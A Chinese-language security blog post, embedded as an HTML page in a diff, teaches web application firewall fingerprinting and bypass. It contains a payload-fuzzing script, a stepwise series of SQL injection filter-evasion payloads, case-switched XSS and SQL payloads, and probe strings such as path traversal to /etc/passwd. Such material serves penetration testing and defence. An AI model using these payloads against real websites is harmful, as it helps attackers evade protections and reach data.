@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Web应用程序防火墙是位于Web应用程序与客户端端点之间的安全策略实施点。该功能可以用软件或硬件，在设备设备中运行或在运行通用操作系统的典型服务器中实现。它可以是独立设备，也可以集成到其他网络组件中。 对于WAF,你了解多少？需要这篇文章能对你有所帮助！  介绍WAF如何工作： 使用一组规则来区分正常请求和恶意请求。 学习模式通过了解用户行为自动添加规则 。  WAF如何防御： 负面模型（基于黑">
+<meta name="keywords" content="bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="waf从入门到Bypass">
+<meta property="og:url" content="https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Web应用程序防火墙是位于Web应用程序与客户端端点之间的安全策略实施点。该功能可以用软件或硬件，在设备设备中运行或在运行通用操作系统的典型服务器中实现。它可以是独立设备，也可以集成到其他网络组件中。 对于WAF,你了解多少？需要这篇文章能对你有所帮助！  介绍WAF如何工作： 使用一组规则来区分正常请求和恶意请求。 学习模式通过了解用户行为自动添加规则 。  WAF如何防御： 负面模型（基于黑">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-12-04T08:00:07.158Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="waf从入门到Bypass">
+<meta name="twitter:description" content="Web应用程序防火墙是位于Web应用程序与客户端端点之间的安全策略实施点。该功能可以用软件或硬件，在设备设备中运行或在运行通用操作系统的典型服务器中实现。它可以是独立设备，也可以集成到其他网络组件中。 对于WAF,你了解多少？需要这篇文章能对你有所帮助！  介绍WAF如何工作： 使用一组规则来区分正常请求和恶意请求。 学习模式通过了解用户行为自动添加规则 。  WAF如何防御： 负面模型（基于黑">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>waf从入门到Bypass | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/12/04/waf从入门到Bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">waf从入门到Bypass
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-12-04 15:49:22 / 修改时间：16:00:07" itemprop="dateCreated datePublished" datetime="2019-12-04T15:49:22+08:00">2019-12-04</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">33k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">30 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <blockquote>
+<p>Web应用程序防火墙是位于Web应用程序与客户端端点之间的安全策略实施点。该功能可以用软件或硬件，在设备设备中运行或在运行通用操作系统的典型服务器中实现。它可以是独立设备，也可以集成到其他网络组件中。 对于WAF,你了解多少？需要这篇文章能对你有所帮助！</p>
+</blockquote>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="WAF如何工作："><a href="#WAF如何工作：" class="headerlink" title="WAF如何工作："></a>WAF如何工作：</h3><ul>
+<li>使用一组规则来区分正常请求和恶意请求。</li>
+<li>学习模式通过了解用户行为自动添加规则 。</li>
+</ul>
+<h3 id="WAF如何防御："><a href="#WAF如何防御：" class="headerlink" title="WAF如何防御："></a>WAF如何防御：</h3><ul>
+<li>负面模型（基于黑名单）-黑名单模型使用预设的签名来阻止显然是恶意的Web流量，并使用签名来防止利用某些网站和Web应用程序漏洞的攻击。 将模型Web应用程序防火墙列入黑名单是公共互联网上的网站和Web应用程序的绝佳选择，并且对主要的DDoS攻击类型非常有效。 例如。 阻止所有 <script> *</script> 输入的规则。</li>
+<li>肯定模型（基于白名单）-白名单模型仅允许根据特定配置的标准进行网络访问。 例如，可以将其配置为仅允许来自某些IP地址的HTTP GET请求。 该模型对于阻止可能的网络攻击可能非常有效，但是白名单将阻止大量合法流量。 将模型列入白名单的防火墙可能最适合内部网络上的Web应用程序，该网络应用程序设计为仅由有限的一组人员（例如员工）使用。</li>
+<li>混合/混合模型（包含模型）-混合安全模型是一种混合了白名单和黑名单的模型。 根据各种具体的配置细节，混合防火墙可能是内部网络上的Web应用程序和公用Internet上的Web应用程序的最佳选择</li>
+</ul>
+<h2 id="如何识别WAF"><a href="#如何识别WAF" class="headerlink" title="如何识别WAF"></a>如何识别WAF</h2><h3 id="识别waf技术"><a href="#识别waf技术" class="headerlink" title="识别waf技术"></a>识别waf技术</h3><ul>
+<li>一些WAF在请求中设置自己的cookie（例如Citrix,Netscaler,Yunsuo WAF,safedog）</li>
+<li>有些人将自己与单独的标头关联（例如Anquanbao WAF,AmazonAWSWAF）。</li>
+<li>有些经常更改标头和混乱的字符以使攻击者感到困惑（例如Netscaler,Big-IP）。</li>
+<li>有些人在服务器头数据包中暴露自己（eg. Approach, WTS WAF）</li>
+<li>一些WAF在响应内容body中公开自身（例如DotDefender,Armor,Sitelock）</li>
+<li>其他WAF会对恶意请求做出不寻常的响应代码答复（例如WebKnight,360WAF</li>
+<li>有些WAF会返回一堆垃圾数据，卡死你(例如:百度云加速乐)</li>
+</ul>
+<h3 id="检测技术"><a href="#检测技术" class="headerlink" title="检测技术:"></a>检测技术:</h3><ol>
+<li>从浏览器发出普通的GET请求，拦截并记录响应头（特别是cookie）。</li>
+<li>从命令行（例如cURL）发出请求，并测试响应内容和标头（不包括user-agent）。</li>
+<li>向随机开放的端口发出GET请求，并抓住可能暴露WAF身份的标语。</li>
+<li>如果某处有登录页面，表单页面等.请尝试一些常见的（易于检测的）有效负载，例如 &quot; or 1=1 -- -</li>
+<li>将../../../etc/passwd附加到URL末尾的随机参数</li>
+<li>在url的末尾添加一些吸引人的关键字，如&#39;or sleep（5）‘</li>
+<li>使用过时的协议（如http/0.9）发出get请求（http/0.9不支持post类型查询）。</li>
+<li>很多时候，waf根据不同的交互类型改变服务器头。</li>
+<li>删除操作技术-发送一个原始的fin/rst包到服务器并识别响应。</li>
+<li>侧通道攻击-检查请求和响应内容的计时行为。</li>
+</ol>
+<h2 id="主流WAF指纹识别"><a href="#主流WAF指纹识别" class="headerlink" title="主流WAF指纹识别:"></a>主流WAF指纹识别:</h2><blockquote>
+<p>根据一些waf检测特性，我们可以一些小技巧，对WAF进行识别</p>
+</blockquote>
+<h3 id="识别工具"><a href="#识别工具" class="headerlink" title="识别工具"></a>识别工具</h3><ul>
+<li>wafw00f <a href="https://github.com/enablesecurity/wafw00f" target="_blank" rel="noopener">https://github.com/enablesecurity/wafw00f</a></li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ wafw00f -l</span><br><span class="line"></span><br><span class="line">                 <span class="attribute">______</span></span><br><span class="line">                /      \</span><br><span class="line">               (  Woof! )</span><br><span class="line">                \______/                      )</span><br><span class="line">                ,,                           ) (_</span><br><span class="line">           .-. -    _______                 ( |__|</span><br><span class="line">          ()``; |==|_______)                .)|__|</span><br><span class="line">          / ('        /|\                  (  |__|</span><br><span class="line">      (  /  )        / | \                  . |__|</span><br><span class="line">       \(_)_))      /  |  \                   |__|</span><br><span class="line"></span><br><span class="line">    WAFW00F - Web Application Firewall Detection Tool</span><br><span class="line"></span><br><span class="line">Can test for these WAFs:</span><br><span class="line"></span><br><span class="line">aeSecure (aeSecure)</span><br><span class="line">Airlock (Phion/Ergon)</span><br><span class="line">ASP.NET Generic Protection (Microsoft)</span><br><span class="line">Astra Web Protection (Czar Securities)</span><br><span class="line">AWS Elastic Load Balancer (Amazon)</span><br><span class="line">Yunjiasu (Baidu Cloud Computing)</span><br><span class="line">Barikode (Ethic Ninja)</span><br><span class="line">Barracuda Application Firewall (Barracuda Networks)</span><br><span class="line">Bekchy (Faydata Technologies Inc.)</span><br><span class="line">BinarySec (BinarySec)</span><br><span class="line">BitNinja (BitNinja)</span><br><span class="line">BlockDoS (BlockDoS)</span><br><span class="line">Bluedon (Bluedon IST)</span><br><span class="line">CacheWall (Varnish)</span><br><span class="line">CdnNS Application Gateway (CdnNs/WdidcNet)</span><br><span class="line">WP Cerber Security (Cerber Tech)</span><br><span class="line">ChinaCache CDN Load Balancer (ChinaCache)</span><br><span class="line">Chuang Yu Shield (Yunaq)</span><br><span class="line">ACE XML Gateway (Cisco)</span><br><span class="line">Cloudbric (Penta Security)</span><br><span class="line">Greywizard (Grey Wizard)</span><br><span class="line">HyperGuard (Art of Defense)</span><br><span class="line">.....</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>identywaf <a href="https://github.com/stamparm/identywaf" target="_blank" rel="noopener">https://github.com/stamparm/identywaf</a></li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python identYwaf.py </span><br><span class="line">                                    __ __ </span><br><span class="line"> ____  ___      ___  ____   ______ |  T  T __    __   ____  _____ </span><br><span class="line">l    j|   \    /  _]|    \ |      T|  |  ||  T__T  T /    T|   __|</span><br><span class="line"> |  T |    \  /  [_ |  _  Yl_j  l_j|  ~  ||  |  |  |Y  o  ||  l_</span><br><span class="line"> |  | |  D  YY    _]|  |  |  |  |  |___  ||  |  |  ||     ||   _|</span><br><span class="line"> j  l |     ||   [_ |  |  |  |  |  |     ! \      / |  |  ||  ] </span><br><span class="line">|____jl_____jl_____jl__j__j  l__j  l____/   \_/\_/  l__j__jl__j  (1.0.XX)</span><br><span class="line"></span><br><span class="line"><span class="attribute">Usage</span>: python identYwaf.py [options] &lt;host|url&gt;</span><br><span class="line"></span><br><span class="line"><span class="attribute">Options:</span></span><br><span class="line">  --version           Show program's version number and exit</span><br><span class="line">  -h, --help          Show this help message and exit</span><br><span class="line">  --delay=DELAY       Delay (sec) between tests (default: 0)</span><br><span class="line">  --timeout=TIMEOUT   Response timeout (sec) (default: 10)</span><br><span class="line">  --proxy=PROXY       HTTP proxy address (e.g. "http://127.0.0.1:8080")</span><br><span class="line">  --proxy-file=PRO..  Load (rotating) HTTP(s) proxy list from a file</span><br><span class="line">  --random-agent      Use random HTTP User-Agent header value</span><br><span class="line">  --code=CODE         Expected HTTP code in rejected responses</span><br><span class="line">  --string=STRING     Expected string in rejected responses</span><br><span class="line">  --post              Use POST body for sending payloads</span><br></pre></td></tr></table></figure>
+
+<h2 id="WAF绕过技巧"><a href="#WAF绕过技巧" class="headerlink" title="WAF绕过技巧"></a>WAF绕过技巧</h2><h3 id="Fuzzing绕过"><a href="#Fuzzing绕过" class="headerlink" title="Fuzzing绕过"></a>Fuzzing绕过</h3><h4 id="测试受阻"><a href="#测试受阻" class="headerlink" title="测试受阻"></a>测试受阻</h4><p>在对waf测试过程中，下面这段请求被WAF拦截</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/get/index.jsp?id=payload</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.101</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=B4640D0258CA8C041F8102EE58A1E76B</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+
+<h4 id="选择Fuzzing字典"><a href="#选择Fuzzing字典" class="headerlink" title="选择Fuzzing字典"></a>选择Fuzzing字典</h4><ul>
+<li><a href="https://github.com/danielmiessler/SecLists/tree/master/Fuzzing" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/tree/master/Fuzzing</a></li>
+<li><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/attack" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb/tree/master/attack</a></li>
+<li><a href="https://github.com/foospidy/payloads" target="_blank" rel="noopener">https://github.com/foospidy/payloads</a></li>
+</ul>
+<h4 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzzing</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payloads = []</span><br><span class="line">    special_chars = [<span class="string">'\r'</span>, <span class="string">'\n'</span>, <span class="string">'\t'</span>, <span class="string">'_'</span>, <span class="string">'~'</span>, <span class="string">'&amp;'</span>, <span class="string">'-'</span>, <span class="string">'='</span>, <span class="string">'/'</span>, <span class="string">'*'</span>,<span class="string">'^'</span>, <span class="string">'$'</span>, <span class="string">','</span>, <span class="string">'.'</span>, <span class="string">'/'</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>, <span class="string">'|'</span>, <span class="string">'/**/'</span>, <span class="string">'--'</span>,<span class="string">'\r\n'</span>, <span class="string">'||'</span>]</span><br><span class="line">    <span class="comment">#special_chars 字典在步骤2中选择合适的</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> special_chars:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                temp_payload = payload[:k] + char + payload[k:]</span><br><span class="line">                payloads.append(temp_payload)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payloads</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h4><p><strong>过滤关键词</strong>:<code>and</code>, <code>or</code>, <code>union</code> <strong>可能正则</strong>: <code>preg_match(&#39;/(and|or|union)/i&#39;, $id)</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: union select user, password from users</span><br><span class="line">- Bypass: 1 || (select user from users where user_id = 1) = 'admin'</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h4><p><strong>过滤关键词</strong>: <code>and</code>, <code>or</code>, <code>union</code>, <code>where</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: 1 || (select user from users where user_id = 1) = 'admin'</span><br><span class="line">- Bypass: 1 || (select user from users limit 1) = 'admin'</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h4><p><strong>过滤关键词</strong>: <code>and</code>, <code>or</code>, <code>union</code>, <code>where</code> , <code>limit</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: 1 || (select user from users limit 1) = 'admin'</span><br><span class="line">- Bypass: 1 || (select user from users group by user_id having user_id = 1) = 'admin'</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h4><p><strong>过滤关键词</strong>: <code>and</code>, <code>or</code>, <code>union</code>, <code>where</code> ,<code>limit</code> , <code>group by</code>, <code>select</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: 1 || (select user from users group by user_id having user_id = 1) = 'admin'</span><br><span class="line">- Bypass: 1 || (select substr(group_concat(user_id),1,1) user from users ) = 1</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h4><p><strong>过滤关键词</strong>: <code>and</code>, <code>or</code>, <code>union</code>, <code>where</code> ,<code>limit</code> , <code>group by</code> , <code>select</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</span><br><span class="line">- Bypass: 1 || 1 = 1 into outfile 'result.txt'</span><br><span class="line">- Bypass: 1 || substr(user,1,1) = 'a'</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h4><p><strong>过滤关键词</strong>: <code>and</code>, <code>or</code>, <code>union</code>, <code>where</code> ,<code>limit</code> , <code>group by</code> , <code>select</code> , <code>&#39;</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: 1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1</span><br><span class="line">- Bypass: 1 || user_id is not null</span><br><span class="line">- Bypass: 1 || substr(user,1,1) = 0x61</span><br><span class="line">- Bypass: 1 || substr(user,1,1) = unhex(61)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-7"><a href="#Step-7" class="headerlink" title="Step 7"></a>Step 7</h4><p><strong>过滤关键词</strong>: <code>and</code>, <code>or</code>, <code>union</code>, <code>where</code> ,<code>limit</code> , <code>group by</code> , <code>select</code>,<code>&#39;</code>,<code>hex</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: 1 || substr(user,1,1) = unhex(61)</span><br><span class="line">- Bypass: 1 || substr(user,1,1) = lower(conv(11,10,36))</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-8"><a href="#Step-8" class="headerlink" title="Step 8"></a>Step 8</h4><p><strong>过滤关键词</strong>: <code>and</code>, <code>or</code>, <code>union</code>, <code>where</code> ,<code>limit</code> , <code>group by</code> , <code>select</code>,<code>&#39;</code>,<code>hex</code> , <code>substr</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: 1 || substr(user,1,1) = lower(conv(11,10,36))</span><br><span class="line">- Bypass: 1 || lpad(user,7,1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Step-9"><a href="#Step-9" class="headerlink" title="Step 9"></a>Step 9</h4><p><strong>过滤关键词</strong>: <code>and</code>, <code>or</code>, <code>union</code>, <code>where</code> ,<code>limit</code> , <code>group by</code> , <code>select</code>,<code>&#39;</code>,<code>hex</code> , <code>substr</code> ,<code>white space</code></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- Blocked: 1 || lpad(user,7,1)</span><br><span class="line">- Bypass: 1%0b||%0blpad(user,7,1)</span><br></pre></td></tr></table></figure>
+
+<h3 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h3><h4 id="大小写切换"><a href="#大小写切换" class="headerlink" title="大小写切换"></a>大小写切换</h4><ul>
+<li>一些开发不完善的WAF会选择性过滤特定案例的WAF。.</li>
+<li>我们可以结合使用大小写字符来开发有效的有效载荷.</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Standard</span>: &lt;script&gt;alert()&lt;/script&gt;</span><br><span class="line"><span class="attribute">Bypassed</span>: &lt;ScRipT&gt;alert()&lt;/sCRipT&gt;</span><br><span class="line"><span class="attribute">Standard</span>: SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'</span><br><span class="line"><span class="attribute">Bypassed</span>: sELecT * FrOm all_tables whERe OWNER = 'DATABASE_NAME'</span><br></pre></td></tr></table></figure>
+
+<h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><ul>
+<li>使用％编码/ URL编码对普通有效载荷进行编码。</li>
+<li>在线工具</li>
+<li>Burp包含一个内置编码器/解码器</li>
+</ul>
